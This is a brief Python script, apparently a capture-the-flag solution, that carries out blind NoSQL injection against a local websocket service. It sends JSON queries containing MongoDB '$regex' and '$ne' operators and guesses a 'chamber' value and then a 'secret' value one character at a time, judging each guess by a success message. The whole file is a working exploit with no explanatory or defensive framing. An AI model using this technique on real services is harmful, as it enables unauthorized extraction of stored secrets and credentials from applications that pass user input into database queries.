import json
from websocket import create_connection

printable = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}$'

ws = create_connection("ws://127.0.0.1:8000/")

chamber = ''
secret = ''
found = False

while not found:
    for c in printable:
        data = {"chamber": {"$regex": f"^{chamber}{c}.*"}, "secret": {"$ne":1} }
        ws.send(json.dumps(data))
        result =  ws.recv()
        print(c)
        if result == "Looks like you know your secret!":
            print(c)
            found = c == '$'
            chamber += c
            break

chamber = chamber[:-1]
print('chamber:', chamber)

found = False

while not found:
    for c in printable:
        data = {"chamber": chamber , "secret": {"$regex": f'^{secret}{c}.*'} }
        ws.send(json.dumps(data))
        result =  ws.recv()
        if result == "Looks like you know your secret!":
            found = c == '$'
            secret += c
            break

secret = secret[:-1]
print('secret:', secret)


ws.close()
